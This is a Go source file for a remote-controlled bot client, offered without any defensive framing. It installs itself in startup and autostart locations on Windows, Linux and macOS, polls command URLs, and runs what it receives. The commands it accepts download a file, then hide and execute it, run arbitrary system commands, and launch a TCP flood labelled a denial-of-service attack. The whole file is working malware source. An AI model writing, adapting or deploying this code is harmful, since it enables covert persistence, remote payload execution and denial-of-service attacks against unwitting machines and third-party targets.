package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// isAdmin checks if the current user has admin privileges
func isAdmin() (bool, error) {
	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err != nil {
			if strings.Contains(err.Error(), "Access is denied") {
				return false, nil
			}
			return false, err
		}
		return true, nil
	case "linux", "darwin":
		if os.Geteuid() != 0 {
			return false, nil
		}
		return true, nil
	default:
		return false, nil
	}
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	err = os.WriteFile(dst, input, 0644)
	return err
}

// AutostartOnWin adds the executable to the Windows startup folder
func AutostartOnWin(executablePath string) {
	var startupPath string
	admin, err := isAdmin()

	if err != nil {
		return
	}

	if admin {
		startupPath = filepath.Join(os.Getenv("ProgramData"), "Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
	} else {
		startupPath = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	}

	destPath := filepath.Join(startupPath, filepath.Base(executablePath))

	err = copyFile(executablePath, destPath)
	if err != nil {
		return
	}
}

// autostartOnLinuxAndDarwin adds the executable to the autostart directory on Linux and Darwin
func autostartOnLinuxAndDarwin(executablePath string) {
	var autostartDir string
	admin, err := isAdmin()
	if err != nil {
		return
	}

	switch runtime.GOOS {
	case "darwin":
		if admin {
			autostartDir = "/Library/LaunchAgents"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
		}
	case "linux":
		if admin {
			autostartDir = "/etc/xdg/autostart"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
		}
	default:
		return
	}

	err = os.MkdirAll(autostartDir, 0755)
	if err != nil {
		return
	}

	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
	err = os.Symlink(executablePath, destPath)
	if err != nil {
		return
	}
}

// runAtStartup adds the executable to the autostart directory depending on the OS
func runAtStartup() {
	executable, err := os.Executable()
	if err != nil {
		return
	}

	if runtime.GOOS == "windows" {
		AutostartOnWin(executable)
	} else {
		autostartOnLinuxAndDarwin(executable)
	}
}

// Config holds the configuration for the program
type Config struct {
	URL        string   `json:"url"`
	BackupURLs []string `json:"backups"`
	WebhookURL string   `json:"webhookURL"`
}
// downloadFile downloads a file from a URL and saves it to a local file
func downloadFile(url, filename string, run, hide bool) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return err
	}

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	if hide {
		if runtime.GOOS == "windows" {
			err := exec.Command("attrib", "+H", filename).Run()
			if err != nil {
				return err
			}
		} else {
			hiddenFilename := "." + filename
			err := os.Rename(filename, hiddenFilename)
			if err != nil {
				return err
			}
			filename = hiddenFilename
		}
	}
	if run {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", "start", filename)
		} else {
			os.Chmod(filename, 0755)
			cmd = exec.Command("./" + filename)
		}

		cmd.Run()
	}

	return nil
}

// displayMessageInHTML creates a temporary HTML file and displays a message in it
func displayMessageInHTML(message string) {
	tmpfile, err := ioutil.TempFile("", "message-*.html")
	if err != nil {
		return
	}
	defer tmpfile.Close()

	htmlContent := fmt.Sprintf("<html><body><p>%s</p></body></html>", message)
	_, err = tmpfile.Write([]byte(htmlContent))
	if err != nil {
		return
	}

	openBrowser(tmpfile.Name())
}

// openBrowser opens a URL in the default browser
func openBrowser(url string) {
	var err error

	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		err = fmt.Errorf("unsupported platform")
	}

	if err != nil {
		return
	}
}

// LoadConfig loads the configuration from a JSON file
func LoadConfig(path string) (*Config, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var config Config
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		return nil, err
	}

	return &config, nil
}

// FetchCommand fetches a command from a URL
func FetchCommand(config *Config) (string, error) {
	urls := append([]string{config.URL}, config.BackupURLs...)
	for _, url := range urls {
		resp, err := http.Get(url + "?nocache=" + generateRandomString(20))
		if err == nil && resp.StatusCode == http.StatusOK {
			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()

			if err != nil {
				continue
			}
			return string(body), nil
		}
	}
	return "", nil
}

// generateRandomString generates a random string of a given length
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// DOS performs a Denial of Service attack on a target
func DOS(target string, port string, duration time.Duration) {
	endTime := time.Now().Add(duration)
	var wg sync.WaitGroup

	send := func() {
		defer wg.Done()
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
		if err != nil {
			return
		}
		defer conn.Close()

		_, err = conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
		if err != nil {
			return
		}
	}

	for time.Now().Before(endTime) {
		wg.Add(1)
		go send()

		time.Sleep(10 * time.Millisecond)
	}

	wg.Wait()
}

// executeSystemCommand executes a system command and returns its output
func executeSystemCommand(name string, args []string) (string, error) {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", nil
	}
	return out.String(), nil
}

// ParseCommand parses a command and performs the corresponding action
func ParseCommand(command string) error {
	commands := strings.Split(command, "\n")
	for _, cmd := range commands {
		parts := strings.Fields(cmd)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "popmsg":
			if len(parts) > 1 {
				message := strings.Join(parts[1:], " ")
				displayMessageInHTML(message)
			}
		case "download":
			if len(parts) >= 3 {
				url := parts[1]
				filename := parts[2]

				run := false
				hide := false

				for _, part := range parts[3:] {
					if part == "RUN" {
						run = true
					} else if part == "HIDE" {
						hide = true
					}
				}

				err := downloadFile(url, filename, run, hide)
				if err != nil {
					return err
				}
			} else {
				return nil
			}
		case "cmd":
			if len(parts) > 1 {
				_, err := executeSystemCommand(parts[1], parts[2:])
				if err != nil {
					return err
				}
			} else {
				return nil
			}
		case "dos":
			if len(parts) < 4 {
				return nil
			} else {
				target := parts[1]
				port := parts[2]
				durationStr := parts[3]

				duration, err := time.ParseDuration(durationStr)
				if err != nil {
					return nil
				}

				DOS(target, port, duration)
			}
		default:
			if strings.HasPrefix(cmd, "dos ") {
				info := strings.TrimSpace(strings.TrimPrefix(cmd, "dos "))
				parts := strings.Fields(info)
				if len(parts) < 3 {
					return nil
				}

				target := parts[0]
				port := parts[1]
				durationStr := parts[2]

				duration, err := time.ParseDuration(durationStr + "s")
				if err != nil {
					return nil
				}

				DOS(target, port, duration)
			}
		}

	}
	return nil
}

// main is the entry point of the program
func main() {
	rand.Seed(time.Now().UnixNano())

	config, err := LoadConfig("config.json")
	if err != nil {
		os.Exit(1)
	}

	for {
		command, err := FetchCommand(config)
		if err != nil {
			time.Sleep(60 * time.Second)
			continue
		}

		ParseCommand(command)

		time.Sleep(60 * time.Second)
	}
}
